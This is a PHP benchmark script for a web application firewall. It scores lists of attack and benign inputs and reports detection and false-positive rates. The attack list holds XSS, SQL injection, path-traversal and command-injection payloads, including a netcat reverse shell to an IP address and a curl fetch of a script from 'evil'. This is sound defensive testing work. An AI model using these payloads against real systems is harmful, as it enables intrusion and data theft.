<?php

declare(strict_types=1);

/**
 * Detection benchmark. Run on the CLI:
 *
 *     php tests/run.php
 *
 * Reports detection rate against known attacks and false-positive rate
 * against benign traffic. These two numbers are how you actually judge a WAF.
 */

require __DIR__ . '/../autoload.php';

use Waf\Detector;
use Waf\Normalizer;

$config    = require __DIR__ . '/../config.php';
$threshold = (int) $config['scoring']['block_threshold'];
$detector  = new Detector($config['disabled_rules'] ?? []);
$norm      = new Normalizer();

$score = static function (string $payload) use ($detector, $norm): int {
    return $detector->inspect($norm->normalize($payload))['score'];
};

// --- payloads that SHOULD be flagged --------------------------------------
$attacks = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "%3Cscript%3Ealert(1)%3C/script%3E",          // url-encoded
    "%253Cscript%253E",                            // double url-encoded
    "&lt;script&gt;alert(1)&lt;/script&gt;",       // html-entity
    "' OR '1'='1",
    "1' OR 1=1 -- ",
    "admin' OR 1=1#",
    "UNION SELECT username,password FROM users",
    "1; DROP TABLE users",
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index",
    "; cat /etc/passwd",
    "| nc -e /bin/sh 10.0.0.1 4444",
    "\$(curl http://evil/x.sh)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
];

// --- benign payloads that must NOT be flagged -----------------------------
$benign = [
    "John O'Brien",
    "I love coding and security!",
    "SELECT a great wine for dinner",            // 'select' as a normal word
    "https://example.com/products?id=42&sort=price",
    "comparison of prices for laptops",          // contains 'on='? no -> sanity
    "function() is my favorite topic to learn",  // 'function' as a word, no call
    "The cat sat on the mat",                    // 'cat ' as a word
    "user@example.com",
    "My password is hunter2 and I won't tell",
    "Order #1234 shipped on 2025-01-01",
    "C++ and union types in programming",        // 'union' without select
    "Let's meet at 3pm or 4pm tomorrow",         // 'or' as a word
    "她在学习网络安全",                           // unicode
    "Price: 1 < 2 and 5 > 3 in math class",
    "Rendez-vous à 14h",
    "naïve café résumé",
    "Click here to read more about our products",
    "The summary and details of the report",     // 'details'/'summary' as words
    "100% organic cotton t-shirt, size M",
    "git commit -m 'fix the login bug'",
];

$pass = "\033[32m";
$fail = "\033[31m";
$dim  = "\033[90m";
$rst  = "\033[0m";

echo "\nWAF detection benchmark  (block threshold = {$threshold})\n";
echo str_repeat('-', 64) . "\n";

$caught = 0;
echo "ATTACKS (expect score >= {$threshold})\n";
foreach ($attacks as $p) {
    $s   = $score($p);
    $hit = $s >= $threshold;
    $caught += $hit ? 1 : 0;
    printf("  %s%-5s%s  score=%-3d  %s%s\n",
        $hit ? $pass : $fail, $hit ? 'PASS' : 'MISS', $rst,
        $s, $dim, trim_preview($p));
}

$falsePos = 0;
echo "\nBENIGN (expect score < {$threshold})\n";
foreach ($benign as $p) {
    $s  = $score($p);
    $fp = $s >= $threshold;
    $falsePos += $fp ? 1 : 0;
    printf("  %s%-5s%s  score=%-3d  %s%s\n",
        $fp ? $fail : $pass, $fp ? 'FP!' : 'OK', $rst,
        $s, $dim, trim_preview($p));
}

$detRate = $caught / count($attacks) * 100;
$fpRate  = $falsePos / count($benign) * 100;

echo "\n" . str_repeat('-', 64) . "\n";
printf("Detection rate:      %s%5.1f%%%s  (%d/%d attacks caught)\n",
    $detRate >= 90 ? $pass : $fail, $detRate, $rst, $caught, count($attacks));
printf("False-positive rate: %s%5.1f%%%s  (%d/%d benign flagged)\n",
    $fpRate <= 5 ? $pass : $fail, $fpRate, $rst, $falsePos, count($benign));
echo "\n";

exit(($detRate >= 90 && $fpRate <= 5) ? 0 : 1);

function trim_preview(string $s): string
{
    $s = preg_replace('/\s+/', ' ', $s) ?? $s;
    return mb_strlen($s) > 46 ? mb_substr($s, 0, 46) . '…' : $s;
}
